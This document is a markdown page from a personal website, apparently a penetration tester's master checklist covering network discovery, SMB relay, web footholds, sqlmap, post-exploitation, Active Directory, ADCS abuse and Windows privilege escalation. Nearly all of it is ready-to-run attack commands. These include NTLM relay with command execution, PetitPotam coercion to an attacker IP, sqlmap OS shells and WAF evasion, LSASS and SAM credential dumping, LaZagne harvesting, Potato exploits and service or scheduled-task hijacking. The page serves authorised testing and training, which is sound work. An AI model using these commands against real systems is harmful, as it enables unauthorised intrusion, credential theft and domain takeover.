+++
title = "Old - Checklist"
+++

This page is the master checklist where sections can be embedded into the relevant doc pages (e.g. Active Directory) via `embed-section` (custom Hugo shortcode for this website).

# Host Discovery & ARP

- [ ] **1. Passive Listen (Responder / tcpdump)** (Run Responder in passive mode or `tcpdump` to observe broadcast traffic, discover hosts, and passively collect credentials before any active scanning)
- [ ] **2. Interface & Subnet Mapping** (Identify your own IP and CIDR via `ip a` or `ipconfig` to define the scope)
- [ ] **3. Passive Neighbor Discovery** (Check the local ARP cache via `arp -a` or `ip neigh` to see connected peers)
- [ ] **4. Active Host Discovery** (Run `nmap -sn <CIDR>` or `netdiscover` to sweep the subnet via ARP/ICMP)
- [ ] **5. Role Identification** (Scan live hosts for specific ports like 88/445/389 to distinguish DCs from workstations)

# DNS

- [ ] **1. Server Recon & Zone Transfer** (Identify Nameservers, Bind version, and attempt `dig axfr` or `dig any` for a full dump)
- [ ] **2. Record Enumeration** (Query standard types A, MX, TXT, SRV, and run Reverse DNS/PTR against IP ranges)
- [ ] **3. Subdomain Discovery** (Combine passive cert transparency logs via `crt.sh` with active bruteforcing via `gobuster`/`puredns`)
- [ ] **4. Vulnerability Analysis** (Check for dangling CNAMEs for Domain Takeover, and monitor LLMNR/NBT-NS if internal)

# SMB

- [ ] **1. Anonymous Access & Share Listing** (Attempt a null session via `smbclient -L <IP> -N` or `nxc smb <IP> --shares` to list shares without credentials)
- [ ] **2. Comprehensive Enumeration** (Run `enum4linux-ng -A <IP>` to automatically dump users, groups, OS info, and password policies)
- [ ] **3. Share Content Inspection** (Mount accessible shares or use `smbclient` to browse directories for sensitive files, scripts, or backups)
- [ ] **4. Security Posture Check** (Use `nmap --script=smb-security-mode` to verify if SMB signing is required, which is critical for preventing relay attacks)
- [ ] **5. Relay Target Generation** (`nxc smb <SUBNET>/24 --gen-relay-list relay-targets.txt` → empty output: signing enforced everywhere, stop | targets found: Step 6)
- [ ] **6. Relay Infrastructure** (Disable SMB/HTTP in `Responder.conf` → `sudo responder -I <IFACE> -rdwv` + `sudo impacket-ntlmrelayx -tf relay-targets.txt --smb2support` → wait for inbound auth → Step 7)
- [ ] **7. Relay Target Decision** (SMB exec: add `-c "<CMD>"` to ntlmrelayx | LDAP — RBCD: `--delegate-access` or shadowcreds: `--shadow-credentials` | HTTP/CA — ADCS ESC8: `-t http://<CA_IP>/certsrv/certfnsh.asp --adcs` + PetitPotam coerce → cert → NT hash → done)

# Web

- [ ] **1. Technology & Security Fingerprinting** (Use `whatweb` and `nikto` to identify the server, frameworks, and WAF, and `curl` to inspect headers and robots.txt)
- [ ] **2. Content & vHost Discovery** (Run `feroxbuster` or `gobuster dir` to bruteforce directories/files, and `gobuster vhost` to find hidden virtual hosts)
- [ ] **3. Automated Vulnerability Scanning** (Use `nikto` or `wapiti` to scan for common misconfigurations and known vulnerabilities like outdated software)
- [ ] **4. Manual Application Testing (OWASP Top 10)** (After automated scans, manually inspect the application for logical flaws, focusing on Injection, Broken Access Control, and XSS)

# web-foothold

- [ ] **1. Fingerprint:** `whatweb <TARGET> && curl -sI <TARGET>` → identify server, framework, WAF → known CVE for version: exploit-db first → **done** | unknown: continue
- [ ] **2. Directory bust:** `feroxbuster -u <TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak` → note: login forms, upload endpoints, admin panels, API paths, XML endpoints → **triage by finding type below**
- [ ] **3. Vuln scan:** `nuclei -u <TARGET> -t exposures/ -t vulnerabilities/ -t misconfiguration/` → CVE or template match: exploit directly → **done** | no match: continue
- [ ] **4. Login form:** try default creds first (`admin:admin`, `admin:password`, app-specific defaults) → `' OR 1=1--` in user/pass → if SQL error or bypass: go to `sql-injection.md` | locked out after 3: brute later with lockout policy in hand
- [ ] **5. File upload:** go to `file-upload.md` → try extension bypass → Content-Type mismatch → magic bytes → SVG XXE → **RCE or LFI → done**
- [ ] **6. Parameters reflecting input:** inject `{{7*7}}` → `49` or `7777777`: go to `ssti-xxe.md` (SSTI) | inject `<script>alert(1)</script>`: go to `xss.md` | inject `; id #`: go to `command-injection.md` | inject `../../../etc/passwd`: go to `file-inclusion.md`
- [ ] **7. XML-accepting endpoint:** `Content-Type: application/xml` or SOAP → go to `ssti-xxe.md` → submit `TESTSTRING` entity probe → if reflected: classic XXE → if blind: OOB exfil
- [ ] **8. Admin panel:** default creds → auth bypass headers (`X-Forwarded-For: 127.0.0.1`, `X-Original-IP: 127.0.0.1`) → IDOR on user ID parameter → **done**
- [ ] **9. Parameters with file paths:** `?page=`, `?file=`, `?path=` → go to `file-inclusion.md` → `../../../etc/passwd` + PHP wrappers (`php://filter/convert.base64-encode/resource=index.php`)
- [ ] **10. Nothing bites:** check for SSRF (`?url=`, `?dest=`, `?img=`, webhook fields) → go to `ssrf.md` | check JS source for API keys, hidden endpoints, GraphQL (`/graphql`, `/api/graphql`)

# SQL

If these steps fail, the target is likely not vulnerable via automation.

**Phase 1: Injection & Tuning**
- [ ] **Manual Triage (Burp):** Confirm "True" vs "False" response size manually. *Never run SQLMap blind.*
- [ ] **The Setup:** Save request to `req.txt`. Mark injection point with `*`. (`sqlmap -r req.txt --batch`)
- [ ] **The Unlocker (Tuning):** Logic (`OR`) or Brackets (`)))`) failing? (`--level 5 --risk 3`)
- [ ] **The Syntax Fix:** SQLMap guessing wrong boundaries? (`--prefix="')"` - Match your Burp findings).
- [ ] **The Speedup:** Time-based checks taking forever? (`--technique=BEU` - Force Boolean/Error/Union only).

**Phase 2: Stability & Evasion**
- [ ] **The Hallucination Fix:** "2 letters off" or garbage data? (`--string="SuccessMsg"` or `--text-only`).
- [ ] **The Bypass:** WAF blocking or 403s? (`--random-agent --tamper=space2comment --skip-waf`).

**Phase 3: Loot & Shells**
- [ ] **The Recon:** Check privileges immediately. (`--is-dba --current-db`).
- [ ] **The Dump:** Surgical extraction (Don't dump the world). (`-D <DB> -T <TABLE> -C <USER,PASS> --dump`).
- [ ] **The Endgame (RCE):** DBA is True? (`--os-shell` (Add `--technique=E` if empty) OR `--file-write="shell.php"`).

**Troubleshooting (Panic Modifiers)**
*Add these to **The Dump** if injection exists but data fails to extract.*
- [ ] **`--union-cols=X`**: Manually set column count (if SQLMap counts wrong).
- [ ] **`--no-cast`**: Disable payload casting (Fixes specific DB errors).
- [ ] **`--hex`**: Encode data extraction (Bypasses WAF filters on output).

# post-exploit-first-15-minutes

*Run both columns simultaneously; domain-joined branches noted.*

| # | Linux | Windows |
| --- | --- | --- |
| **1. Identity** | `id && whoami && hostname` | `whoami /all && hostname` |
| **2. Network** | `ip a && ip route && cat /etc/hosts` | `ipconfig /all && route print` |
| **3. Domain-joined?** | `realm list` or `cat /etc/krb5.conf` → joined: `find / -name "*.keytab" 2>/dev/null` + collect tickets `klist` | `net config workstation` → joined: run SharpHound immediately |
| **4. Privs** | `sudo -l` → NOPASSWD entry: GTFObins it now | `whoami /priv` → SeImpersonate/SeDebug/SeBackup: escalate before anything else |
| **5. Local users** | `cat /etc/passwd \| grep sh$` | `net localgroup administrators` |
| **6. Creds in environment** | `env && cat ~/.bash_history && cat /var/www/*/.env 2>/dev/null` | `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"` + `LaZagne.exe all` |
| **7. Interesting files** | `find / -name "*.conf" -o -name "id_rsa" 2>/dev/null \| head -30` | `dir /s /b C:\*.config C:\*.xml C:\*.ini 2>nul \| findstr /i pass` |
| **8. Services / listeners** | `ss -tlnp` → unusual port: `ls -la /proc/$(lsof -ti :<PORT>)/exe` | `netstat -anob` → unusual port: `tasklist /FI "PID eq <PID>"` |
| **9. Cron / scheduled tasks** | `crontab -l && ls -la /etc/cron*/*` → writable script: inject payload | `schtasks /query /fo LIST /v \| findstr /i "run as\|task to run"` |
| **10. Pivot scope** | `arp -a && cat /etc/hosts` → new subnets: add to proxychains + scope | `arp -a && route print` → new subnets: add to scope, check for dual-homed interfaces |

# Active Directory

- [ ] **1. Domain & Network Identification** (Identify DC IP, Domain Name, Ports 53/88/389/445, `net config workstation`)
- [ ] **2. User Enumeration** (Build target list via Kerbrute, RID Cycling, or `net user /domain`)
- [ ] **3. Initial Credential Acquisition** (Run Responder for LLMNR/NBT-NS poisoning, check AS-REP Roasting)
- [ ] **4. BloodHound Collection & Analysis** (Run SharpHound, upload data, analyze "Shortest Paths" and "High Value Targets")
- [ ] **5. Service & Misconfiguration Hunting** (Kerberoasting TGS, check SYSVOL/GPP for passwords, DNS/Printer Bug checks)
- [ ] **6. ACL & Object Rights Analysis** (Check for "Dangerous Rights" like GenericAll/WriteDACL via PowerView or BloodHound)
- [ ] **7. ADCS Triage** (`certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -enabled` → any `[!] Vulnerabilities:` lines: go to ADCS checklist)
- [ ] **8. Certificate Services (ADCS) Check** (Enumerate vulnerable templates, Shadow Credentials/PyWhisker, Pass-the-Certificate)
- [ ] **9. Delegation Enumeration** (`Get-DomainComputer -Unconstrained` for unconstrained | `Get-DomainComputer -TrustedToAuth` for constrained | `Get-DomainObject -Properties msDS-AllowedToActOnBehalfOfOtherIdentity` for RBCD → any found: go to Kerberos Delegation Abuse)
- [ ] **10. NoPac Detection** (`nxc smb <DC_IP> -u <USER> -p <PASS> -M nopac` → `vulnerable: True`: exploit SAMAccountName spoofing via noPac.py)
- [ ] **11. Access & Admin Validation** (Check Local Admin rights, test RDP/WinRM access, verify "Double Hop" status)
- [ ] **12. Lateral Movement** (Execute Pass-the-Hash, Pass-the-Ticket, or Overpass-the-Hash to pivot)
- [ ] **13. Domain Dominance** (Perform DCSync to dump NTDS.dit, create Golden Tickets, enumerate Trusts)
- [ ] **14. Trust Enumeration** (`Get-DomainTrust` or `nltest /domain_trusts` → external/forest trusts found: BloodHound "Map Domain Trusts" query → pivot via SID history abuse or cross-domain Kerberoasting)

# adcs

- [ ] **1. Enumerate:** `certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -enabled` → scan output for `[!] Vulnerabilities:` lines → **ESC1:** Step 2 | **ESC2:** Step 3 | **ESC3:** Step 4 | **ESC4:** Step 5 | **ESC6:** Step 6 | **ESC7:** Step 7 | **ESC8:** Step 8 | **nothing:** Step 9
- [ ] **2. ESC1 — Enrollee Supplies Subject:** `certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> -upn administrator@<DOMAIN>` → `certipy auth -pfx administrator.pfx -dc-ip <DC_IP>` → **NT hash → done**
- [ ] **3. ESC2 — Any Purpose EKU:** enroll on ESC2 template (Step 2 command, no `-upn`) → use result `.pfx` as enrollment agent → run Step 4 with `-pfx <USER>.pfx` → `certipy auth` → **done**
- [ ] **4. ESC3 — Enrollment Agent:** `certipy req ... -template <TEMPLATE_NAME>` (get agent cert) → `certipy req ... -pfx <USER>.pfx -on-behalf-of '<DOMAIN>\Administrator' -template User` → `certipy auth -pfx administrator.pfx -dc-ip <DC_IP>` → **done**
- [ ] **5. ESC4 — Writable Template ACL:** `certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -template <TEMPLATE_NAME> -save-old` then `-write-default-configuration` → back to **Step 2** → restore: `certipy template ... -write-configuration <TEMPLATE_NAME>.json`
- [ ] **6. ESC6 — CA flag EDITF_ATTRIBUTESUBJECTALTNAME2:** `certipy req ... -template User -upn administrator@<DOMAIN>` → `certipy auth -pfx administrator.pfx -dc-ip <DC_IP>` → **done** (any Client Auth template works)
- [ ] **7. ESC7 — CA ACL:** `certipy ca ... -add-officer <USER>` → `-enable-template SubCA` → `certipy req ... -template SubCA -upn administrator@<DOMAIN>` (note Request ID from denial) → `certipy ca ... -issue-request <REQUEST_ID>` → `certipy req ... -retrieve <REQUEST_ID>` → `certipy auth` → **done**
- [ ] **8. ESC8 — HTTP Web Enrollment:** `sudo impacket-ntlmrelayx --smb2support --adcs -t http://<TARGET_IP>/certsrv/certfnsh.asp` + `python3 PetitPotam.py -u '' -p '' <ATTACKER_IP> <DC_IP>` → `echo '<B64>' | base64 -d > dc.pfx` → `certipy auth -pfx dc.pfx -dc-ip <DC_IP>` → **done**
- [ ] **9. Nothing found:** `Get-DomainComputer -Unconstrained` (delegation abuse) | `nxc smb <TARGET> -M nopac` (noPac) | check BloodHound for `GenericWrite` on users (Shadow Credentials) → pivot to `active-directory.md`

# windows-privesc

- [ ] **1. Auto-enum:** `winPEASx64.exe` → note all `[+]` / `[!]` findings → triage in order below
- [ ] **2. Token privileges:** `whoami /priv` → **SeImpersonate or SeAssignPrimaryToken:** Step 3 | **SeBackupPrivilege:** Step 5 | **SeDebugPrivilege:** LSASS dump via Mimikatz → **done** | **SeRestorePrivilege / SeTakeOwnership:** overwrite target binary → **done**
- [ ] **3. Potato family:** check OS — Win 10 1809+ / Server 2019+: `GodPotato.exe -cmd "<PAYLOAD>"` | older: `JuicyPotato.exe -l 53375 -p cmd.exe -a "/c <PAYLOAD>" -t *` | PrintSpoofer: `PrintSpoofer.exe -i -c cmd` → **SYSTEM shell → done**
- [ ] **4. Weak service ACLs / unquoted paths:** `Get-ModifiableService` and `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "windows" | findstr /i /v """"` → writable: `sc config <SERVICE> binPath= "<PAYLOAD>"` → restart → **done**
- [ ] **5. SeBackupPrivilege — hive dump:** `Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\Temp\SAM` + `SYSTEM` hive → `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` → **hashes → done**
- [ ] **6. Registry — AlwaysInstallElevated:** `reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` AND `HKCU\...` → both `0x1`: `msiexec /quiet /i <PAYLOAD>.msi` → **SYSTEM → done**
- [ ] **7. Registry — AutoLogon:** `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"` → `DefaultPassword` present: reuse creds laterally → **done**
- [ ] **8. Scheduled tasks:** `schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"` → running as SYSTEM with writable binary: `copy /y <PAYLOAD>.exe "<TASK_BINARY>"` → wait for trigger
- [ ] **9. Credentials in files:** `LaZagne.exe all` and `findstr /si password *.xml *.ini *.txt *.config C:\` → creds found: authenticate or lateral move → **done**
- [ ] **10. CVE / installed software:** `wmic product get name,version` → cross-reference searchsploit → patch date via `wmic qfe get HotFixID,InstalledOn` → exploit known unpatched CVE
